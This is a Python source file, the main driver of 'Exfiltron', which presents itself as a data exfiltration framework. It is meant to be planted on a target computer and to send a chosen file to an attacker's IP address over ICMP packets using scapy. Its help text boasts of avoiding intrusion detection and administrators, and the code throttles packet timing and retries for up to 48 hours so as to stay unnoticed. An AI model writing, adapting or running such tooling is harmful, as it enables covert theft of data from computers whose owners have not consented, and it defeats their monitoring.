"""
File: exfiltron.py
Author: Thomas Daniels
Purpose: This is the main running program for the Exfiltron framework. This
        program is used as a prompt for the attacker to execute his or her
        desired commands using other parts of this framework and should be
        placed on the target computer to exfiltrate data from.
"""

############################## Import statements ##############################

import argparse     # For parsing command line arguments
import logging      # Get rid of that pesky scapy IPv6 warning
import sys          # If unexpected results occur, stop usage (and call your doctor)
import time         # For getting some sleep in between packets
import os           # Make sure the user is root

############################## Ensure Runability ##############################

# Is scapy installed? Are you running python 2.7?
try:
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import *  # Use the almighty scapy package
except ImportError:          # Raise an error if scapy is not installed
    print("Could not import scapy. Is it installed? Are you running python2?")
    print("Exiting...")
    sys.exit()

# Make sure the user is running as root
if(os.getuid() is not 0):
    print("You are not running exfiltron as root. Raw packet creation " +
            "requires root privileges.")
    print("Exiting...")
    sys.exit()

############################ Constants/Definitions ############################

RETRY = 3           # The number of times to resend an unanswered packet
TIMEOUT = 2.5       # Timeout = 2.5*amount_of_time_to_wait_between_each_packet
ONE_SEC = 1
SIX_HOURS = 21600   # Six hours in terms of seconds
FOURTY_EIGHT_HOURS = 172800     # Fourty-eight hours in terms of seconds
PROGRESS_BAR_SIZE = 20          # Number of blocks in the progress bar

################################## Functions ##################################

def setArgParserOptions():
    """
    Purpose: Parses the command line args and sends them back to main for
            interpretation
    @param (NoneType) None
    @return (List) a list of parsed arguments to interpret
    """

    # Create the argument parser
    parser = argparse.ArgumentParser(
                        formatter_class=argparse.RawDescriptionHelpFormatter,
                        description=('' +
     '####### ##  ## ####### #### ####   ###### ######   #####  ##   ##\n' +
     ' ##   # ##  ##  ##   #  ##   ##    # ## #  ##  ## ##   ## ###  ##\n' +
     ' ## #    ####   ## #    ##   ##      ##    ##  ## ##   ## #### ##\n' +
     ' ####     ##    ####    ##   ##      ##    #####  ##   ## ## ####\n' +
     ' ## #    ####   ## #    ##   ##   #  ##    ## ##  ##   ## ##  ###\n' +
     ' ##   # ##  ##  ##      ##   ##  ##  ##    ##  ## ##   ## ##   ##\n' +
     '####### ##  ## ####    #### ####### ####  #### ##  #####  ##   ##\n' +

     '\nExfiltron is a data exfiltration framework designed to help you get' +
     ' data off of a machine without tripping an IDS or alerting a system' +
     ' administrator.'), prog='exfiltron.py')

    # Add the method of exfiltration option
    parser.add_argument('method', type=str, help=('This is the method of ' +
                        'exfiltration. Your options are: icmp'))

    # Add the file name option
    parser.add_argument('-f', '--file-name', type=str, help="The name of" +
                        " the file you wish to.. *ahem*... 'borrow'",
                        required=True)

    # Add the destination IP address option
    parser.add_argument('-d', '--dest-ip', type=str, help="The IP " +
                        "address you want the data sent to. Please note " +
                        "that this option is required", required=True)

    # Add the data per packet optional argument
    parser.add_argument('-a', '--data-per-packet', type=int,
                        help="By default, the amount of data stored in a " +
                        "packet is the same as it normally is to decrease " +
                        "the chances of detection by an IDS (example: ICMP" +
                        " exfiltration will have a default packet size of " +
                        "64 bytes). Use this option to send more or less " +
                        "data", default=64)

    # Add the time between packets option argument
    parser.add_argument('-t', '--time', type=int, help='By default, the ' +
                        'amount of time between packets sent is 5 seconds.' +
                        ' Use this option to specify a different amount in' +
                        ' terms of seconds', default=5)

    # Add option to silence progress bar
    parser.add_argument('-q', '--quiet', action='store_false', help="By " +
                        "default, a progress bar is shown displaying the " +
                        "amounts of packets sent out of the total number " +
                        "of packets that need to be sent. Specifying this " +
                        "option silences all output relating to the progress" +
                        " bar", default=True)

    return parser.parse_args()


def send(packets, amountOfTime, destIP, displayProgress):
    """
    Purpose: This function sends out all the packets created by the
            user-specified module
    @param (List) a list of packets created by scapy to send to the destIP
    @param (int) the amount of time to wait before sending another packet
    @param (String) destIP - The IP of the attacker (you!)
    @param (bool) displayProgress - tells us whether or not to display progress
    @return (NoneType) None
    """

    numPackets = len(packets)
    count = 0

    # TODO: Make progress bar
    # Send each packet in the list
    for packet in packets:

        # Print the progress bar
        if(displayProgress):
            progressBar(count, numPackets)

        # first_offense allows us to resend the packet twice more before waiting
        # 6 hours to retry
        first_offense = 0

        for numRetries in range(0, FOURTY_EIGHT_HOURS/SIX_HOURS):
            response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
                           filter="host " + destIP + " and icmp", verbose=False)

            # Try twice more for a response if no response was found
            while(first_offense < 2 and response is None):

                # Wait for 1 second before sending the next one
                time.sleep(ONE_SEC)

                response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
                           filter="host " + destIP + " and icmp", verbose=False)
                first_offense += 1

            # If we don't see a response, try again in 6 hours
            if(response is None):
                time.sleep(SIX_HOURS)
            else:
                break  # Continue on to the next packet

            # 48 hours without a response means it's time to quit
            if(numRetries == (FOURTY_EIGHT_HOURS/SIX_HOURS)-1):
                print("No server response has been seen in two days.")
                print("Exiting..")
                sys.exit()

        # Wait for the specified amount of time before sending another packet
        time.sleep(amountOfTime)

        # Increment progress counter
        if(displayProgress):
            count += 1

    if(displayProgress):
        progressBar(count, numPackets)
        print('')

def progressBar(progress, total):
    """
    Purpose: Prints out the progress bar
    @param (int) progress - number of things that have been done
    @param (int) total - number of things to do
    @return (Nonetype) None
    """

    # Determine number of blocks
    totalProgress = progress/float(total)
    numBlocks = int(round(PROGRESS_BAR_SIZE*totalProgress))
    progressString = ("[" + "#"*numBlocks + "-"*(PROGRESS_BAR_SIZE-numBlocks) +
            "] " + str(int(round(100*totalProgress))) + "%")

    sys.stdout.write(progressString)
    sys.stdout.flush()
    sys.stdout.write('\r')

def main():
    # Parse the commands from the command line with argparser
    args = setArgParserOptions()

    # Determine the method of exfiltration
    if(args.method == 'icmp'):
        # Attempt to import Exfiltron's ICMP package
        try:
            import icmp
        except ImportError:
            print("Unable to import the icmp package.\nExiting...")
            sys.exit()

        send(icmp.icmp(args.dest_ip, args.file_name, args.data_per_packet),
             args.time, args.dest_ip, args.quiet)


if (__name__ == '__main__'):
    main()
